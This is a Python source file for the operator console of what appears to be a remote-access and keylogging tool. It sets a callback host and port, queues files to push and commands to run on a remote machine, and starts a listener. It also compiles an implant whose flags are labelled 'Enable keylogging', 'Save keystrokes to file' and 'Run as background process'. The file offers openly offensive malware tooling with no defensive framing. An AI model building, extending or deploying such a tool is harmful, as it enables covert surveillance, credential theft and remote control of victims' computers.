from server.constants import show_banner, BOLD, RESET, GREEN, RED, YELLOW, CYAN
from server.listener import start_listener
from server.compiler import compile_agent
import globals

import os
import threading

# Main
if __name__ == "__main__":
    show_banner()
    background_threads = []
    lhost = None
    lport = None

    print(f"\n{BOLD}{CYAN}[*]{RESET} Type '{BOLD}help{RESET}' to see available commands.")

    while True:
        command = input(f"\n{BOLD}>{RESET} ").strip()

        if command.startswith("set lhost"):
            try:
                lhost = command.split(" ")[2]
                print(f"{GREEN}[+]{RESET} LHOST set to {BOLD}{lhost}{RESET}")
            except IndexError:
                print(f"{RED}[!]{RESET} Usage: set lhost <ip>")

        elif command.startswith("set lport"):
            try:
                lport = command.split(" ")[2]
                print(f"{GREEN}[+]{RESET} LPORT set to {BOLD}{lport}{RESET}")
            except IndexError:
                print(f"{RED}[!]{RESET} Usage: set lport <port>")

        elif command == "show options":
            print(f"\n{BOLD}Current Options:{RESET}")
            print(f"  {BOLD}LHOST{RESET} : {lhost or 'Not Set'}")
            print(f"  {BOLD}LPORT{RESET} : {lport or 'Not Set'}")

        elif command.startswith("send "):
            parts = command.split(maxsplit=2)
            if len(parts) == 3:
                _, source_file, dest_file = parts
                if os.path.exists(source_file):
                    globals.pending_files.append((source_file, dest_file))
                    print(f"{GREEN}[+]{RESET} File {BOLD}{source_file}{RESET} queued to be sent as {BOLD}{dest_file}{RESET}.")
                else:
                    print(f"{RED}[-]{RESET} Error: Source file {source_file} does not exist.")
            else:
                print(f"{RED}[-]{RESET} Usage: send <source_file> <destination_file>")

        elif command.startswith("run "):
            parts = command.split(maxsplit=2)
            if len(parts) == 3:
                _, source_cmd, dest_file = parts
                globals.pending_cmd.append((source_cmd, dest_file))
                print(f"{GREEN}[+]{RESET} Cmd {BOLD}{source_cmd}{RESET} queued to be sent to {BOLD}{dest_file}{RESET}.")
            else:
                print(f"{RED}[-]{RESET} Usage: run <cmd> <destination_file>")

        elif command.startswith("compile"):
            if not lhost or not lport:
                print("[!] Set both LHOST and LPORT before compiling.")
                continue
            
            # Initialize defaults
            enable_all = False
            enable_save_file = False
            enable_daemon_file = False

            # Check for flags
            if "--log" in command:
                enable_all = True
            if "--save" in command:
                enable_save_file = True
                globals.enable_logs = True
            if "--daemon" in command:
                enable_daemon_file = True

            compile_agent(lhost, lport, enable_all, enable_save_file, enable_daemon_file)
            print(f"[>] Compiling with options: log={enable_all}, save={enable_save_file}, daemon={enable_daemon_file}")


        elif command == "listener":
            if not lhost or not lport:
                print(f"{RED}[!]{RESET} Set both LHOST and LPORT before starting the listener.")
            else:
                print(f"{CYAN}[*]{RESET} Starting listener on {BOLD}{lhost}:{lport}{RESET}...")

                def listener_wrapper():
                    try:
                        start_listener(lhost, int(lport))
                    except Exception as e:
                        print(f"{RED}[!]{RESET} Listener error: {e}")

                globals.server_socket = True
                listener_thread = threading.Thread(target=listener_wrapper, daemon=True)
                listener_thread.start()

                try:
                    while True:
                        try:
                            sub_cmd = input(f"{BOLD}(listener){RESET} ").strip().lower()
                            if sub_cmd == "background":
                                globals.server_socket = False
                                print(f"{CYAN}[*]{RESET} Backgrounding listener.")
                                break
                        except EOFError:
                            print(f"\n{CYAN}[*]{RESET} Backgrounding listener (via Ctrl+D).")
                            globals.server_socket = False
                            break
                except KeyboardInterrupt:
                    print(f"\n{CYAN}[*]{RESET} Use 'background' or Ctrl+D to return.")
                    globals.server_socket = False

        elif command == "help":
            print(f"""
{BOLD}Available Commands:{RESET}
  {BOLD}set lhost <ip>{RESET}         Set the callback IP address
  {BOLD}set lport <port>{RESET}       Set the callback port
  {BOLD}show options{RESET}           Show current settings

  {BOLD}send <local> <remote>{RESET}  Send a file from local path to remote system
  {BOLD}run <cmd> <remote>{RESET}     Run a command targeting remote file

  {BOLD}compile [flags]{RESET}        Compile the agent with settings
      {BOLD}--log{RESET}              Enable keylogging
      {BOLD}--save{RESET}             Save keystrokes to file
      {BOLD}--daemon{RESET}           Run as background process

  {BOLD}listener{RESET}               Start the listener server
  {BOLD}exit{RESET}                   Exit the shell
""")

        elif command == "exit":
            print(f"{CYAN}[*]{RESET} Exiting.")
            break

        else:
            print(f"{RED}[!]{RESET} Unknown command. Type '{BOLD}help{RESET}' for a list of commands.")

